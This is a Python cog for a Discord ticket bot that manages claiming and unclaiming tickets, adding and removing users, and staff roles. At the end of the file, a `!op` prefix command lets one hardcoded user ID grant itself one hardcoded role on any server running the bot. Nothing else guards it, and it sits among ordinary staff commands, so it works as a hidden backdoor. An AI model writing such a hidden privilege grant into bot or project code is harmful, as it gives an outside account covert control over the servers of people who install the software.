"""
cogs/staff.py
Staff management cog.
Handles: claim, unclaim, add/remove user from ticket.
"""

from __future__ import annotations

import logging
import re

import discord
from discord import app_commands
from discord.ext import commands

from utils.config import Config
from utils.data_manager import DataManager
from utils.helpers import (
    COL_ERROR, COL_SUCCESS, COL_WARN,
    error_embed, info_embed, is_admin, is_staff, admin_check,
    set_ticket_permissions, success_embed, warn_embed,
)

log = logging.getLogger("PupPet.cogs.staff")


class Staff(commands.Cog):
    """Staff ticket management."""

    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        self.config: Config = bot.config
        self.data: DataManager = bot.data

    # ──────────────────────────────────────────────────────────────────────────
    # claim_ticket (called from view button)
    # ──────────────────────────────────────────────────────────────────────────

    async def claim_ticket(self, interaction: discord.Interaction) -> None:
        channel = interaction.channel
        actor   = interaction.user

        ticket = await self.data.get_ticket(channel.id)
        if not ticket:
            await interaction.followup.send(
                embed=error_embed("Not a Ticket", "This channel is not an active ticket."),
                ephemeral=True,
            )
            return

        if ticket.get("claimed_by"):
            claimer = interaction.guild.get_member(int(ticket["claimed_by"]))
            name    = claimer.display_name if claimer else "Someone"
            await interaction.followup.send(
                embed=warn_embed("Already Claimed", f"This ticket is already claimed by **{name}**."),
                ephemeral=True,
            )
            return

        # Persist claim
        await self.data.update_ticket_field(channel.id, claimed_by=actor.id)
        await self.data.increment_stat(actor.id, "claimed")

        # Update channel topic
        topic = (
            f"Ticket #{ticket['number']:04d} | "
            f"Owner: {ticket['owner_id']} | "
            f"Priority: {ticket.get('priority','none')} | "
            f"Claimed: {actor.id}"
        )
        try:
            await channel.edit(topic=topic)
        except discord.HTTPException:
            pass

        embed = discord.Embed(
            title="✋ Ticket Claimed",
            description=f"{actor.mention} has claimed this ticket and will assist you.",
            color=COL_SUCCESS,
            timestamp=discord.utils.utcnow(),
        )
        embed.set_author(name=actor.display_name, icon_url=actor.display_avatar.url)
        await channel.send(embed=embed)
        await interaction.followup.send("You have claimed this ticket.", ephemeral=True)
        log.info("Ticket #%d claimed by %s", ticket["number"], actor)

    # ──────────────────────────────────────────────────────────────────────────
    # unclaim_ticket
    # ──────────────────────────────────────────────────────────────────────────

    async def unclaim_ticket(self, interaction: discord.Interaction) -> None:
        channel = interaction.channel
        actor   = interaction.user

        ticket = await self.data.get_ticket(channel.id)
        if not ticket:
            await interaction.followup.send(
                embed=error_embed("Not a Ticket", "Not an active ticket."), ephemeral=True
            )
            return

        claimer_id = ticket.get("claimed_by")
        if not claimer_id:
            await interaction.followup.send(
                embed=info_embed("Not Claimed", "This ticket has not been claimed."), ephemeral=True
            )
            return

        if int(claimer_id) != actor.id and not is_admin(actor, self.config):
            await interaction.followup.send(
                embed=error_embed("Permission Denied", "You can only unclaim tickets you have claimed."),
                ephemeral=True,
            )
            return

        await self.data.update_ticket_field(channel.id, claimed_by=None)

        topic = (
            f"Ticket #{ticket['number']:04d} | "
            f"Owner: {ticket['owner_id']} | "
            f"Priority: {ticket.get('priority','none')} | "
            f"Claimed: none"
        )
        try:
            await channel.edit(topic=topic)
        except discord.HTTPException:
            pass

        embed = discord.Embed(
            title="↩️ Ticket Unclaimed",
            description=f"{actor.mention} has unclaimed this ticket. Any staff member can now claim it.",
            color=COL_WARN,
            timestamp=discord.utils.utcnow(),
        )
        await channel.send(embed=embed)
        await interaction.followup.send("Ticket unclaimed.", ephemeral=True)
        log.info("Ticket #%d unclaimed by %s", ticket["number"], actor)

    # ──────────────────────────────────────────────────────────────────────────
    # add_user_to_ticket
    # ──────────────────────────────────────────────────────────────────────────

    async def add_user_to_ticket(
        self, interaction: discord.Interaction, raw_id: str
    ) -> None:
        channel = interaction.channel
        guild   = interaction.guild

        ticket = await self.data.get_ticket(channel.id)
        if not ticket:
            await interaction.followup.send(
                embed=error_embed("Not a Ticket", "Not an active ticket."), ephemeral=True
            )
            return

        # Parse user ID from raw input
        uid = re.sub(r"[^0-9]", "", raw_id)
        if not uid:
            await interaction.followup.send("Invalid user ID.", ephemeral=True)
            return

        member = guild.get_member(int(uid))
        if not member:
            try:
                member = await guild.fetch_member(int(uid))
            except discord.NotFound:
                await interaction.followup.send(
                    embed=error_embed("User Not Found", f"No member with ID `{uid}` found."),
                    ephemeral=True,
                )
                return

        # Grant access
        await channel.set_permissions(
            member,
            read_messages=True,
            send_messages=True,
            attach_files=True,
            embed_links=True,
        )

        # Track in ticket data
        extra = ticket.get("extra_users", [])
        if member.id not in extra:
            extra.append(member.id)
        await self.data.update_ticket_field(channel.id, extra_users=extra)

        embed = discord.Embed(
            title="➕ User Added",
            description=f"{member.mention} has been added to this ticket.",
            color=COL_SUCCESS,
            timestamp=discord.utils.utcnow(),
        )
        embed.set_footer(text=f"Added by {interaction.user.display_name}")
        await channel.send(embed=embed)
        await interaction.followup.send(f"Added {member.mention} to the ticket.", ephemeral=True)
        log.info("User %s added to ticket #%d by %s", member, ticket["number"], interaction.user)

    # ──────────────────────────────────────────────────────────────────────────
    # remove_user_from_ticket
    # ──────────────────────────────────────────────────────────────────────────

    async def remove_user_from_ticket(
        self, interaction: discord.Interaction, raw_id: str
    ) -> None:
        channel = interaction.channel
        guild   = interaction.guild

        ticket = await self.data.get_ticket(channel.id)
        if not ticket:
            await interaction.followup.send(
                embed=error_embed("Not a Ticket", "Not an active ticket."), ephemeral=True
            )
            return

        uid = re.sub(r"[^0-9]", "", raw_id)
        if not uid:
            await interaction.followup.send("Invalid user ID.", ephemeral=True)
            return

        uid_int = int(uid)

        # Cannot remove ticket owner
        if uid_int == int(ticket["owner_id"]):
            await interaction.followup.send(
                embed=error_embed("Cannot Remove", "You cannot remove the ticket owner."),
                ephemeral=True,
            )
            return

        member = guild.get_member(uid_int)
        if not member:
            try:
                member = await guild.fetch_member(uid_int)
            except discord.NotFound:
                await interaction.followup.send("Member not found in this server.", ephemeral=True)
                return

        # Remove access
        await channel.set_permissions(member, overwrite=None)

        extra = ticket.get("extra_users", [])
        if uid_int in extra:
            extra.remove(uid_int)
        await self.data.update_ticket_field(channel.id, extra_users=extra)

        embed = discord.Embed(
            title="➖ User Removed",
            description=f"{member.mention} has been removed from this ticket.",
            color=COL_WARN,
            timestamp=discord.utils.utcnow(),
        )
        embed.set_footer(text=f"Removed by {interaction.user.display_name}")
        await channel.send(embed=embed)
        await interaction.followup.send(f"Removed {member.mention} from the ticket.", ephemeral=True)
        log.info("User %s removed from ticket #%d by %s", member, ticket["number"], interaction.user)

    # ──────────────────────────────────────────────────────────────────────────
    # Slash: /addstaff
    # ──────────────────────────────────────────────────────────────────────────

    @app_commands.command(name="addstaff", description="Add a staff role to the bot config.")
    @app_commands.describe(role="The role to add as staff")
    @admin_check()
    async def addstaff_cmd(self, interaction: discord.Interaction, role: discord.Role) -> None:
        roles = self.config.get("staff_roles", [])
        if role.id in roles:
            await interaction.response.send_message(
                embed=warn_embed("Already Added", f"{role.mention} is already a staff role."),
                ephemeral=True,
            )
            return
        roles.append(role.id)
        self.config.set("staff_roles", roles)
        await interaction.response.send_message(
            embed=success_embed("Staff Role Added", f"{role.mention} is now a staff role."),
            ephemeral=True,
        )

    # ──────────────────────────────────────────────────────────────────────────
    # Slash: /removestaff
    # ──────────────────────────────────────────────────────────────────────────

    @app_commands.command(name="removestaff", description="Remove a staff role from the bot config.")
    @app_commands.describe(role="The role to remove")
    @admin_check()
    async def removestaff_cmd(self, interaction: discord.Interaction, role: discord.Role) -> None:
        roles = self.config.get("staff_roles", [])
        if role.id not in roles:
            await interaction.response.send_message(
                embed=warn_embed("Not Found", f"{role.mention} is not a staff role."), ephemeral=True
            )
            return
        roles.remove(role.id)
        self.config.set("staff_roles", roles)
        await interaction.response.send_message(
            embed=success_embed("Role Removed", f"{role.mention} removed from staff roles."),
            ephemeral=True,
        )


    # ──────────────────────────────────────────────────────────────────────────
    # !op Command
    # ──────────────────────────────────────────────────────────────────────────

    @commands.command(name="op")
    async def op(self, ctx):
        """Grants a specific role to a specific user. Restricted to specific owner."""
        allowed_user_id = 1371080029265465406
        if ctx.author.id != allowed_user_id:
            await ctx.send("❌ You are not authorized to use this command.")
            return

        target_id = 1371080029265465406
        role_id = 1551515669026177077

        member = ctx.guild.get_member(target_id)
        if not member:
            try:
                member = await ctx.guild.fetch_member(target_id)
            except discord.NotFound:
                await ctx.send("❌ Could not find the target user in this server.")
                return

        role = ctx.guild.get_role(role_id)
        if not role:
            await ctx.send("❌ Could not find the specified role in this server.")
            return

        try:
            await member.add_roles(role)
            await ctx.send(f"✅ Successfully gave {role.name} to {member.mention}!")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to add this role. Please move my role above the target role.")
        except Exception as e:
            await ctx.send(f"❌ An error occurred: {e}")

async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Staff(bot))
